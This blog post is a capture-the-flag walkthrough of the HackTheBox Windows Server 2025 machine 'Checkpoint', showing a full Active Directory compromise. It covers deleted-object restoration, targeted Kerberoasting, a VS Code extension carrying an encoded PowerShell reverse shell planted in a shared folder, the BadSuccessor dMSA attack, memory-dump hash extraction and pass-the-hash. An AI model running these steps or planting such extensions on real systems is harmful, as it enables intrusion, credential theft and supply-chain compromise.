---
layout: post
title: "HackTheBox Writeup: Checkpoint"
thumbnail: "/assets/images/checkpoint-htb/99a0f7fe9bb831ce14037c752a6c17a7_MD5.jpg"
---

In this post, we tackle **Checkpoint**, an intricate Windows Server 2025 Active Directory machine on HackTheBox. The attack path starts with leveraging leaked credentials to restore a deleted AD object. We then pivot by planting a malicious VS Code extension in a shared developer folder. Finally, we exploit a novel Windows Server 2025 feature—Delegated Managed Service Accounts (dMSA) via a "BadSuccessor" attack—to access a restricted SMB share, where we perform memory forensics on a VM snapshot to extract the Administrator hash.

---

## 1. Enumeration & Initial Access

We begin with an `nmap` scan against the target to identify active services.

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ nmap 10.129.113.254 -sC -sV
Starting Nmap 7.98 ( [https://nmap.org](https://nmap.org) ) at 2026-08-27 19:44 +0100
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
445/tcp  open  microsoft-ds?
...
```

The scan confirms this is a Domain Controller for `checkpoint.htb`. While reviewing past notes and OSINT, we uncover a leaked set of credentials: `alex.turner : Checkpoint2024!`. 

We validate these credentials against the SMB service using NetExec (`nxc`):

```bash
┌──(mracherr㉿serveur)-[/tmp]
└─$ nxc smb 10.129.114.72 -u 'alex.turner' -p 'Checkpoint2024!' --shares
SMB         10.129.114.72   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.114.72   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.114.72   445    DC01             [*] Enumerated shares
SMB         10.129.114.72   445    DC01             Share           Permissions     Remark
SMB         10.129.114.72   445    DC01             -----           -----------     ------
SMB         10.129.114.72   445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages...
SMB         10.129.114.72   445    DC01             VMBackups
```

We have read access to a highly interesting share named `DevDrop` (used for VS Code `.vsix` extensions) but lack access to `VMBackups`.

![SMB Share Enumeration](/assets/images/checkpoint-htb/183a2580d7e62f2db1450a2e3bf6a9f8_MD5.jpg)

---

## 2. AD Enumeration & Object Restoration

Using `bloodyAD`, we enumerate the Active Directory environment to check for explicit permissions our user `alex.turner` might have:

```bash
┌──(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ python bloodyAD.py -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE
```

We discover `alex.turner` has `WRITE` access to the `Deleted Objects` container and specifically over the deleted `Mark Davies` object. We can restore this user back into the domain!

```bash
┌──(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ python bloodyAD.py -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] CN=Mark Davies\0ADEL... has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

With `Mark Davies` restored, we assign a Service Principal Name (SPN) to the account and perform a targeted Kerberoasting attack to retrieve his ticket:

```bash
┌──(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ python bloodyAD.py -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb set object "Mark.Davies" servicePrincipalName -v "HTTP/markdavies.checkpoint.htb"

┌──(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.114.72 -request-user mark.davies
...
$krb5tgs$18$mark.davies$CHECKPOINT.HTB$*checkpoint.htb/mark.davies*$588309069e9c...
```

![Targeted Kerberoasting](/assets/images/checkpoint-htb/73b2a22e7a3940b86cba2588ae92055a_MD5.jpg)

---

## 3. Lateral Movement: Malicious VS Code Extension

While we have `Mark Davies`'s hash, we notice that he has write access to the `DevDrop` SMB share. Since this share hosts VS Code extensions (`.vsix` packages) that are likely installed by developers, we can craft a malicious extension to gain remote code execution.

We create a dummy extension containing a PowerShell reverse shell in the `extension.js` activation event:

```javascript
// extension.js
const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAU... (base64 payload)');
}
exports.deactivate = function() {}
```

We package it into a `.vsix` archive and upload it to the `DevDrop` share using `smbclient`:

```bash
┌──(mracherr㉿serveur)-[~/tmp_lab/checkPoint/my-extension_3]
└─$ smbclient -U 'mark.davies%Checkpoint2024!' '//10.129.114.72/DevDrop'
smb: \> put evil.vsix
putting file evil.vsix as \evil.vsix
```

Shortly after, a developer machine installs the extension, and we catch a reverse shell as `ryan.brooks`, securing the user flag!

```powershell
┌──(mracherr㉿serveur)-[~]
└─$ nc -nlvp 5555
connect to [10.10.14.149] from (UNKNOWN) [10.129.114.72] 54202
whoami
checkpoint\ryan.brooks

PS C:\users\ryan.brooks\Desktop> cat user.txt
7bfd076e506bdf10b25081093bf522da
```

![Ryan Brooks Shell](/assets/images/checkpoint-htb/8977cbc7fd5798c874d6c43d7761b241_MD5.jpg)

---

## 4. Privilege Escalation: dMSA BadSuccessor Attack

This domain is running the cutting-edge **Windows Server 2025**. This OS introduces **Delegated Managed Service Accounts (dMSA)**. We check for a known vulnerability called `BadSuccessor` using NetExec's LDAP module:

```bash
┌──(mracherr㉿serveur)-[~/tools/Certify]
└─$ nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
BADSUCCE... 10.129.114.173  389    DC01             [+] Found domain controller with operating system Windows Server 2025
BADSUCCE... 10.129.114.173  389    DC01             ryan.brooks (S-1-5-21...), OU=DMSAHolder,DC=checkpoint,DC=htb
```

Our current user, `ryan.brooks`, is located in the `DMSAHolder` OU! This allows us to craft a malicious dMSA account (`evilDMSA6$`) and link its predecessor (`msDS-ManagedAccountPrecededByLink`) to a highly privileged account, effectively hijacking its permissions.

Using `bloodyAD`, we execute the BadSuccessor attack, impersonating `svc_deploy` to generate a TGT for our malicious dMSA account:

```bash
┌──(venv)─(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ python bloodyAD.py -k ccache=~/tmp_lab/checkPoint/attacker_dMSA_a\$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache \
-u ryan.brooks \
--dc-ip 10.129.115.4 \
--host dc01.checkpoint.htb \
-d checkpoint.htb \
add badSuccessor evilDMSA6 \
-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"

[+] Creating DMSA evilDMSA6$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] dMSA TGT stored in ccache file evilDMSA6_9k.ccache
```

![dMSA Attack](/assets/images/checkpoint-htb/af1f3233fefcee853464a32c666674d4_MD5.jpg)

---

## 5. Memory Forensics to Root

With the newly minted Kerberos ticket exported to our environment (`export KRB5CCNAME=evilDMSA6_9k.ccache`), we check our SMB access again:

```bash
┌──(venv)─(mracherr㉿serveur)-[~/tools/bloodyAD]
└─$ nxc smb dc01.checkpoint.htb -k --use-kcache --shares
SMB         dc01.checkpoint.htb 445    DC01             [+] checkpoint.htb\evilDMSA6$ from ccache
SMB         dc01.checkpoint.htb 445    DC01             VMBackups       READ
```

We now have access to the highly restricted `VMBackups` share! We spider the directory and discover a VMware memory snapshot (`.vmem` and `.vmsn`).

```bash
# impacket-smbclient -k -no-pass dc01.checkpoint.htb
# use VMBackups
# cd NightlyBackup_2024-11-01\memory forensics
# get Windows Server 2019-Snapshot1.vmem
```

We download the massive memory dump and analyze it locally using **Volatility 3**. By running the `windows.registry.hashdump.Hashdump` plugin against the `.vmem` file, we extract the local NTLM hashes straight out of RAM:

```bash
┌──(venv)─(mracherr㉿serveur)-[~/tools/bloodyAD/volatility3]
└─$ python3 vol.py -f "../Windows Server 2019-Snapshot1.vmem" windows.registry.hashdump.Hashdump
Volatility 3 Framework 2.28.2
Progress:  100.00		PDB scanning finished
User	rid	lmhash	nthash
Administrator	500	aad3b435b51404eeaad3b435b51404ee	f29e9c014295b9b32139b09a2790be3b
```

![Volatility Hashdump](/assets/images/checkpoint-htb/99a0f7fe9bb831ce14037c752a6c17a7_MD5.jpg)

We successfully extracted the Domain Admin's NTLM hash! We perform a Pass-the-Hash (PtH) attack using `evil-winrm` to obtain an interactive administrative shell:

```powershell
┌──(venv)─(mracherr㉿serveur)-[~/tools/bloodyAD/volatility3]
└─$ evil-winrm -i 10.129.115.99 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\ -Recurse -Filter "root.txt" -ErrorAction SilentlyContinue

    Directory: C:\Users\max.palmer\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/29/2026   8:51 PM             34 root.txt
```

Box completely compromised!